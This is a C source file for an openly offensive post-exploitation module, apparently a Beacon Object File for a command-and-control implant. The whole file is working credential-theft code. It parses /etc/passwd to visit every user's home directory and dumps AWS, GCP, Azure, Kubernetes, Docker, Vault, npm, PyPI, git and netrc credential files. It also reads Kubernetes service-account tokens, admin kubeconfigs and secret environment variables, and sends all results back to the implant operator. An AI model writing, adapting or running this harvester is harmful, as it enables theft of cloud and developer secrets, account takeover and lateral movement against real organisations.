/// cred_harvest.c — BOF: Harvest cloud credentials (AWS/GCP/Azure/K8s/Docker)
/// Compile: gcc -c -o cred_harvest.o cred_harvest.c -include bof_api.h -Os -fPIC
/// Usage: execute bof cred_harvest.o
/// Note: Complements built-in `creds` command with deeper scanning:
///   - Scans ALL users (not just current), requires root
///   - Checks additional locations (terraform, vault, npm, pip, git)
///   - Extracts IMDS/metadata endpoints for cloud pivoting

// getdents64 record structure
struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

#define DT_DIR  4
#define DT_REG  8

typedef struct {
    const char *subpath;
    const char *description;
    int         show_content;  // 1 = dump content, 0 = just report existence
} cred_file_t;

static const cred_file_t cred_files[] = {
    // AWS
    {".aws/credentials",                              "AWS credentials",        1},
    {".aws/config",                                   "AWS config",             1},
    // GCP
    {".config/gcloud/application_default_credentials.json", "GCP ADC",          1},
    {".config/gcloud/credentials.db",                 "GCP credentials DB",     0},
    {".config/gcloud/access_tokens.db",               "GCP access tokens DB",   0},
    // Azure
    {".azure/accessTokens.json",                      "Azure tokens",           1},
    {".azure/azureProfile.json",                      "Azure profile",          0},
    {".azure/msal_token_cache.json",                  "Azure MSAL cache",       1},
    // Docker
    {".docker/config.json",                           "Docker registry auth",   1},
    // Kubernetes
    {".kube/config",                                  "Kubernetes config",      1},
    // Terraform
    {".terraform.d/credentials.tfrc.json",            "Terraform Cloud token",  1},
    {".terraformrc",                                  "Terraform config",       1},
    // Vault
    {".vault-token",                                  "HashiCorp Vault token",  1},
    // NPM
    {".npmrc",                                        "NPM registry auth",     1},
    // Pip / PyPI
    {".pypirc",                                       "PyPI upload credentials", 1},
    // Git
    {".git-credentials",                              "Git stored credentials", 1},
    {".gitconfig",                                    "Git config",            1},
    // Heroku
    {".netrc",                                        "netrc (Heroku/APIs)",   1},
    // GitHub CLI
    {".config/gh/hosts.yml",                          "GitHub CLI token",      1},
    // Fly.io
    {".fly/config.yml",                               "Fly.io token",          1},
    // Pulumi
    {".pulumi/credentials.json",                      "Pulumi credentials",    1},
    // Ansible
    {".ansible/vault_password",                       "Ansible vault pw",      1},
    // Sentinel
    {(const char *)0, (const char *)0, 0}
};

static void scan_user_creds(const char *homedir, const char *username) {
    int found = 0;

    for (int i = 0; cred_files[i].subpath; i++) {
        char filepath[768];
        AxSnprintf(filepath, sizeof(filepath), "%s/%s", homedir, cred_files[i].subpath);

        unsigned int mode = 0;
        long fsize = 0;
        if (AxFileStat(filepath, &mode, &fsize, (unsigned int *)0, (unsigned int *)0) != 0)
            continue;

        if (found == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[+] User: %s (%s)\n", username, homedir);
        }
        found++;

        if (cred_files[i].show_content && fsize > 0 && fsize < 65536) {
            char *data = (char *)0;
            int dlen = AxReadFileToBuffer(filepath, &data, 65536);
            if (dlen > 0 && data) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [CRED] %s — %s (%ld bytes)\n",
                             cred_files[i].subpath, cred_files[i].description, fsize);
                // Indent content
                BeaconOutput(CALLBACK_OUTPUT, "  ---\n", 6);
                BeaconOutput(CALLBACK_OUTPUT, data, dlen);
                if (dlen > 0 && data[dlen - 1] != '\n')
                    BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
                BeaconOutput(CALLBACK_OUTPUT, "  ---\n", 6);
                AxFree(data);
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  [FILE] %s — %s (%ld bytes)\n",
                         cred_files[i].subpath, cred_files[i].description, fsize);
        }
    }
}

static void check_system_creds(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== System-wide credential files ===\n");

    typedef struct {
        const char *path;
        const char *desc;
        int show;
    } sys_cred_t;

    static const sys_cred_t sys_creds[] = {
        {"/etc/shadow",                                    "Shadow passwords",     0},
        {"/var/run/secrets/kubernetes.io/serviceaccount/token", "K8s SA token",     1},
        {"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "K8s CA cert",    0},
        {"/var/run/secrets/kubernetes.io/serviceaccount/namespace", "K8s namespace", 1},
        {"/etc/rancher/k3s/k3s.yaml",                     "K3s kubeconfig",       1},
        {"/etc/kubernetes/admin.conf",                     "K8s admin config",     1},
        {"/var/lib/kubelet/kubeconfig",                    "Kubelet config",       1},
        {"/root/.docker/config.json",                      "Root Docker auth",     1},
        {"/etc/docker/daemon.json",                        "Docker daemon config", 1},
        {"/etc/vault.d/vault.hcl",                         "Vault server config",  1},
        {"/etc/consul.d/consul.hcl",                       "Consul config",        0},
        {"/opt/containerd/config.toml",                    "Containerd config",    0},
        {(const char *)0, (const char *)0, 0}
    };

    for (int i = 0; sys_creds[i].path; i++) {
        unsigned int mode = 0;
        long fsize = 0;
        if (AxFileStat(sys_creds[i].path, &mode, &fsize, (unsigned int *)0, (unsigned int *)0) != 0)
            continue;

        if (sys_creds[i].show && fsize > 0 && fsize < 65536) {
            char *data = (char *)0;
            int dlen = AxReadFileToBuffer(sys_creds[i].path, &data, 65536);
            if (dlen > 0 && data) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [CRED] %s — %s (%ld bytes)\n",
                             sys_creds[i].path, sys_creds[i].desc, fsize);
                BeaconOutput(CALLBACK_OUTPUT, "  ---\n", 6);
                BeaconOutput(CALLBACK_OUTPUT, data, dlen);
                if (dlen > 0 && data[dlen - 1] != '\n')
                    BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
                BeaconOutput(CALLBACK_OUTPUT, "  ---\n", 6);
                AxFree(data);
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  [FILE] %s — %s (%ld bytes)\n",
                         sys_creds[i].path, sys_creds[i].desc, fsize);
        }
    }
}

static void check_env_creds(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== Environment variables (secrets) ===\n");

    const char *env_vars[] = {
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_CLOUD_PROJECT",
        "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
        "VAULT_TOKEN", "VAULT_ADDR",
        "DOCKER_AUTH_CONFIG",
        "GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN",
        "NPM_TOKEN",
        "DATABASE_URL", "DB_PASSWORD", "MYSQL_ROOT_PASSWORD",
        "POSTGRES_PASSWORD", "REDIS_PASSWORD",
        "JWT_SECRET", "SECRET_KEY", "API_KEY",
        (const char *)0
    };

    int found = 0;
    for (int i = 0; env_vars[i]; i++) {
        char val[1024];
        if (AxGetEnv(env_vars[i], val, sizeof(val)) > 0) {
            // Mask partial value for OPSEC
            int vlen = AxStrlen(val);
            if (vlen > 8) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [ENV] %s = %c%c%c%c...%c%c%c%c (%d chars)\n",
                             env_vars[i], val[0], val[1], val[2], val[3],
                             val[vlen-4], val[vlen-3], val[vlen-2], val[vlen-1], vlen);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "  [ENV] %s = %s\n", env_vars[i], val);
            }
            found++;
        }
    }

    if (found == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  (no secret env vars found)\n");
    }
}

void go(char *args, int args_len) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Deep credential harvest\n");

    // 1. Scan all users from /etc/passwd
    char *passwd = (char *)0;
    int passwd_len = AxReadFileToBuffer("/etc/passwd", &passwd, 524288);
    if (passwd_len > 0 && passwd) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n=== Per-user credential files ===\n");

        char *line = passwd;
        while (line < passwd + passwd_len) {
            char *eol = line;
            while (eol < passwd + passwd_len && *eol != '\n')
                eol++;

            // Parse: username:x:uid:gid:gecos:homedir:shell
            int field = 0;
            char *username = line;
            int username_len = 0;
            char *homedir = (char *)0;
            int homedir_len = 0;
            char *field_start = line;

            for (char *p = line; p <= eol; p++) {
                if (p == eol || *p == ':') {
                    if (field == 0) {
                        username = field_start;
                        username_len = (int)(p - field_start);
                    } else if (field == 5) {
                        homedir = field_start;
                        homedir_len = (int)(p - field_start);
                    }
                    field++;
                    field_start = p + 1;
                }
            }

            if (homedir && homedir_len > 1 && homedir_len < 256) {
                char home_buf[512];
                AxMemcpy(home_buf, homedir, homedir_len);
                home_buf[homedir_len] = '\0';

                char uname_buf[256];
                if (username_len > 255) username_len = 255;
                AxMemcpy(uname_buf, username, username_len);
                uname_buf[username_len] = '\0';

                // Skip nonexistent home dirs
                unsigned int mode = 0;
                if (AxFileStat(home_buf, &mode, (long *)0, (unsigned int *)0, (unsigned int *)0) == 0) {
                    scan_user_creds(home_buf, uname_buf);
                }
            }

            line = eol + 1;
        }
        AxFree(passwd);
    }

    // 2. System-wide credential files
    check_system_creds();

    // 3. Environment variables
    check_env_creds();

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Harvest complete\n");
}
